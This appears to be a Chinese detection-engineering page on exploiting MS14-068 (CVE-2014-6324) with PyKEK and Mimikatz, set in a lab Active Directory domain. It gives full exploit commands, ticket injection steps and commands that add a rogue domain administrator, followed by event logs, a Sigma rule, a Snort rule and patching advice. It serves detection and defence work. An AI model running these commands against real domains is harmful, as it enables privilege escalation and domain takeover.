# T1212-Win-MS14-068-PYKEK

## 描述

攻击者可能利用软件漏洞尝试收集凭据或提升特权。软件漏洞利用是指攻击者通过程序、服务、操作系统软件或内核中的编程错误执行恶意代码。MS14-068（CVE-2014-6324）是一个针对WindowsKerberos协议的漏洞，允许已认证的域用户通过伪造Kerberos票据（TGT）将其权限提升至域管理员级别，从而完全控制域内资源。该漏洞利用PythonKerberosExploitationKit（PyKEK）等工具实现，结合Mimikatz可将伪造票据注入内存，规避认证机制并访问域内任意系统。

## 测试案例

**测试环境**：
- 域控制器：WindowsServer2008R2（未打补丁KB3011780）
- 域内主机：Windows7SP1（域成员）
- 工具：PyKEK（ms14-068.py）、Mimikatz
- 要求：有效的域用户凭据（用户名、密码）、用户SID、域控制器地址、时间同步（Kerberos要求客户端与DC时间差小于5分钟）

**测试准备**：
1. 确认域控制器未安装MS14-068补丁（KB3011780）。
2. 获取域用户凭据（用户名、密码）及用户SID（通过`whoami/user`获取）。
3. 确保域内主机与域控制器网络连通，时间同步（使用`nettime/set`或`rdate`与DC同步）。
4. 下载PyKEK（<https://github.com/bidord/pykek>）并安装依赖（Python2.7、Kerberos支持库）。

**测试步骤**：
1. 在域内主机上查询当前用户SID：
   ```cmd
   whoami/user
   ```
   示例输出：
   ```
   USERINFORMATION
   ----------------
   UserName         SID
   ==============================================================
   lab\darthsidious S-1-5-21-1473643419-774954089-2222329127-1110
   ```
2. 检查对域控制器C$共享的访问权限（通常无权限）：
   ```cmd
   dir\\dc.lab.adsecurity.org\C$
   ```
   预期输出：
   ```
   dir:Accessisdenied
   ```
3. 使用PyKEK生成伪造的Kerberos票据：
   ```cmd
   pythonms14-068.py-udarthsidious@lab.adsecurity.org-pTheEmperor99!-sS-1-5-21-1473643419-774954089-2222329127-1110-ddc.lab.adsecurity.org
   ```
   成功后生成`.ccache`文件（如`TGT_darthsidious@lab.adsecurity.org.ccache`）。
4. 使用Mimikatz注入票据：
   ```cmd
   mimikatz.exe
   kerberos::purge
   kerberos::list
   kerberos::ptcTGT_darthsidious@lab.adsecurity.org.ccache
   exit
   ```
5. 验证域管理员权限：
   ```cmd
   dir\\dc.lab.adsecurity.org\C$
   ```
   预期输出：成功列出C$共享内容。

**参考资源**：
- 内网渗透之PTH&PTT&PTK：<https://www.bbsmax.com/A/A7zgkjRPz4/>
- PyKEK工具：<https://github.com/bidord/pykek>

## 检测日志

**数据来源**：
- **Windows安全日志**：域控制器上的事件ID4624（账户登录）、4672（特权分配）、4768（Kerberos认证请求）、4769（Kerberos服务票据请求）。
- **网络流量**：捕获Kerberos协议流量（端口88），关注AS-REQ和TGS-REQ中`include-pac:False`的异常请求。
- **Sysmon日志**（可选）：事件ID1（进程创建，监控`ms14-068.py`或Mimikatz执行）、事件ID3（网络连接，捕获与DC的Kerberos通信）。

**关键日志字段**：
- 事件ID4624：`AccountDomain`（异常域格式，如`ABC.COM`而非`ABC`）、`AccountName`（伪造用户）。
- 事件ID4672：`AccountDomain`（异常域格式）、`AssignedPrivileges`（包含高权限如SeDebugPrivilege）。
- 事件ID4768/4769：`SuppliedRealmName`（异常域格式）、`TicketOptions`（异常票据请求）。

## 测试复现

**环境配置**：
- 域控制器：WindowsServer2008R2（未打补丁）
- 域内主机：Windows7SP1
- 工具：PyKEK、Mimikatz
- 域用户：`darthsidious@lab.adsecurity.org`，密码`TheEmperor99!`，SID`S-1-5-21-1473643419-774954089-2222329127-1110`
- 域控制器：`dc.lab.adsecurity.org`

**复现步骤**：
1. 在域内主机上执行：
   ```cmd
   whoami/user
   dir\\dc.lab.adsecurity.org\C$
   pythonms14-068.py-udarthsidious@lab.adsecurity.org-pTheEmperor99!-sS-1-5-21-1473643419-774954089-2222329127-1110-ddc.lab.adsecurity.org
   ```
   输出示例：
   ```
   [+]BuildingAS-REQfordc.lab.adsecurity.org...Done!
   [+]SendingAS-REQtodc.lab.adsecurity.org...Done!
   [+]ReceivingAS-REPfromdc.lab.adsecurity.org...Done!
   [+]ParsingAS-REPfromdc.lab.adsecurity.org...Done!
   [+]BuildingTGS-REQfordc.lab.adsecurity.org...Done!
   [+]SendingTGS-REQtodc.lab.adsecurity.org...Done!
   [+]ReceivingTGS-REPfromdc.lab.adsecurity.org...Done!
   [+]Creatingccachefile'TGT_darthsidious@lab.adsecurity.org.ccache'...Done!
   ```
2. 使用Mimikatz注入票据：
   ```cmd
   mimikatz.exe"kerberos::purge""kerberos::list""kerberos::ptcTGT_darthsidious@lab.adsecurity.org.ccache"exit
   ```
3. 验证权限提升：
   ```cmd
   dir\\dc.lab.adsecurity.org\C$
   netusernewadminP@ssw0rd123/add/domain
   netgroup"DomainAdmins"newadmin/add/domain
   ```

## 测试留痕

**Windows安全日志（域控制器）**：
- **事件ID4624**（账户登录）：
  ```xml
  <Event>
    <EventData>
      <DataName="TargetUserName">darthsidious</Data>
      <DataName="TargetDomainName">LAB.ADSECURITY.ORG</Data>
      <DataName="LogonType">3</Data>
      <DataName="AuthenticationPackageName">Kerberos</Data>
    </EventData>
  </Event>
  ```
- **事件ID4672**（特权分配）：
  ```xml
  <Event>
    <EventData>
      <DataName="TargetUserName">darthsidious</Data>
      <DataName="TargetDomainName">LAB.ADSECURITY.ORG</Data>
      <DataName="AssignedPrivileges">SeDebugPrivilege,SeTcbPrivilege</Data>
    </EventData>
  </Event>
  ```
- **事件ID4769**（Kerberos服务票据请求）：
  ```xml
  <Event>
    <EventData>
      <DataName="TargetUserName">darthsidious</Data>
      <DataName="TargetDomainName">LAB.ADSECURITY.ORG</Data>
      <DataName="ServiceName">krbtgt/LAB.ADSECURITY.ORG</Data>
      <DataName="TicketOptions">0x40810010</Data>
    </EventData>
  </Event>
  ```

**网络流量（WireShark）**：
- AS-REQ：`include-pac:False`（正常请求包含PAC）。
- TGS-REQ：包含伪造PAC，使用MD5（非标准HMAC_MD5或AES）。

## 检测规则/思路

### Sigma规则

```yaml
title:MS14-068PyKEKKerberosExploitationAttempt
id:7a8b9c2d-5e6f-4f3a-9b8c-2e3f4a5b6c7d
status:stable
description:DetectspotentialMS14-068exploitationattemptsusingPyKEKtoforgeKerberosticketsforprivilegeescalation
references:
  -https://attack.mitre.org/techniques/T1212/
  -https://github.com/ThreatHuntingProject/ThreatHunting/blob/master/hunts/golden_ticket.md
  -https://adsecurity.org/?p=556
tags:
  -attack.privilege_escalation
  -attack.t1212
logsource:
  product:windows
  service:security
detection:
  selection_4624:
    EventID:4624
    LogonType:3
    AuthenticationPackageName:Kerberos
    TargetDomainName|contains:'.'
  selection_4672:
    EventID:4672
    TargetDomainName|contains:'.'
    AssignedPrivileges|contains:
      -SeDebugPrivilege
      -SeTcbPrivilege
  selection_4768:
    EventID:4768
    SuppliedRealmName|contains:'.'
  selection_4769:
    EventID:4769
    ServiceName|contains:'krbtgt'
    TargetDomainName|contains:'.'
  timeframe:5s
  condition:selection_4624andselection_4672and(selection_4768orselection_4769)
fields:
  -EventID
  -TargetUserName
  -TargetDomainName
  -LogonType
  -AuthenticationPackageName
  -AssignedPrivileges
  -SuppliedRealmName
  -ServiceName
falsepositives:
  -LegitimateKerberosauthenticationwithcomplexdomainnames
  -Administrativetoolsaccessingdomainresources
level:high
```

### 检测思路

1. **日志监控**：
   - 监控域控制器安全日志，关注事件ID4624、4672、4768、4769，检查`TargetDomainName`或`SuppliedRealmName`是否包含异常点号（`.`）。
   - 检测事件ID4672中分配的高权限（如SeDebugPrivilege），结合非管理员用户。

2. **网络监控**：
   - 使用WireShark或IDS（如Snort）捕获Kerberos流量，检测AS-REQ中`include-pac:False`或TGS-REQ中使用MD5校验的异常票据。
   - 示例Snort规则：
     ```snort
     alertudpanyany->any88(msg:"MS14-068PyKEKExploitAttempt";content:"include-pac:False";sid:1000001;)
     ```

3. **行为分析**：
   - 检测低权限用户突然访问域控制器C$共享或其他高权限资源。
   - 监控Mimikatz相关进程（如`mimikatz.exe`）或异常Kerberos票据注入行为。

4. **补丁状态检查**：
   - 使用PowerShell脚本（如Get-DCPatchStatus）检查域控制器是否安装KB3011780补丁。

## 防御建议

1. **及时打补丁**：
   - 优先为域控制器（WindowsServer2008/2008R2）安装KB3011780补丁，次之为服务器和工作站。
   - 定期检查补丁状态，确保所有系统更新至最新。

2. **强化日志配置**：
   - 启用Kerberos事件日志（事件ID4768/4769），设置失败和成功审计，降低日志量可仅记录失败事件。
   - 部署Sysmon，监控进程创建（事件ID1）和网络连接（事件ID3），捕获PyKEK或Mimikatz活动。

3. **限制域用户权限**：
   - 最小化域用户权限，避免普通用户访问域控制器敏感资源。
   - 使用组策略限制非管理员用户对C$共享的访问。

4. **网络监控**：
   - 部署IDS/IPS，检测Kerberos异常流量（如`include-pac:False`或MD5校验）。
   - 确保客户端与域控制器时间同步，防止伪造票据利用时间差。

5. **主动防御**：
   - 部署诱捕账户（HoneyAccounts），监控异常高权限访问。
   - 使用EDR工具检测Mimikatz或PyKEK相关行为，如票据注入或异常进程。

## 参考推荐

- MITREATT&CK:ExploitationforCredentialAccess(T1212)  
  <https://attack.mitre.org/techniques/T1212/>
- 内网渗透之PTH&PTT&PTK  
  <https://www.bbsmax.com/A/A7zgkjRPz4/>
- ActiveDirectorySecurity:MS14-068ExploitwithPyKEK  
  <https://adsecurity.org/?p=556>
- MicrosoftSecurityBulletinMS14-068  
  <https://support.microsoft.com/kb/3011780>